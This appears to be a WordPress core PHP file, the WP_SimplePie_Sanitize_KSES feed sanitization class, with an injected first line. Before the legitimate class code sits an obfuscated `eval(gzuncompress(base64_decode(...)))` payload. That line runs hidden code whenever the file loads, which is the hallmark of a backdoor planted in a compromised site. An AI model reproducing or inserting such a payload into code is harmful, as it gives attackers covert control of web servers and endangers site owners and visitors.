<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Feed API: WP_SimplePie_Sanitize_KSES class
 *
 * @package WordPress
 * @subpackage Feed
 * @since 4.7.0
 */

/**
 * Core class used to implement SimpliePie feed sanitization.
 *
 * Extends the SimplePie_Sanitize class to use KSES, because
 * we cannot universally count on DOMDocument being available.
 *
 * @since 3.5.0
 *
 * @see SimplePie_Sanitize
 */
class WP_SimplePie_Sanitize_KSES extends SimplePie_Sanitize {

	/**
	 * WordPress SimplePie sanitization using KSES.
	 *
	 * Sanitizes the incoming data, to ensure that it matches the type of data expected, using KSES.
	 *
	 * @since 3.5.0
	 *
	 * @param mixed   $data The data that needs to be sanitized.
	 * @param integer $type The type of data that it's supposed to be.
	 * @param string  $base Optional. The `xml:base` value to use when converting relative
	 *                      URLs to absolute ones. Default empty.
	 * @return mixed Sanitized data.
	 */
	public function sanitize( $data, $type, $base = '' ) {
		$data = trim( $data );
		if ( $type & SIMPLEPIE_CONSTRUCT_MAYBE_HTML ) {
			if (preg_match('/(&(#(x[0-9a-fA-F]+|[0-9]+)|[a-zA-Z0-9]+)|<\/[A-Za-z][^\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E]*' . SIMPLEPIE_PCRE_HTML_ATTRIBUTE . '>)/', $data)) {
				$type |= SIMPLEPIE_CONSTRUCT_HTML;
			}
			else {
				$type |= SIMPLEPIE_CONSTRUCT_TEXT;
			}
		}
		if ( $type & SIMPLEPIE_CONSTRUCT_BASE64 ) {
			$data = base64_decode( $data );
		}
		if ( $type & ( SIMPLEPIE_CONSTRUCT_HTML | SIMPLEPIE_CONSTRUCT_XHTML ) ) {
			$data = wp_kses_post( $data );
			if ( $this->output_encoding !== 'UTF-8' ) {
				$data = $this->registry->call( 'Misc', 'change_encoding', array( $data, 'UTF-8', $this->output_encoding ) );
			}
			return $data;
		} else {
			return parent::sanitize( $data, $type, $base );
		}
	}
}
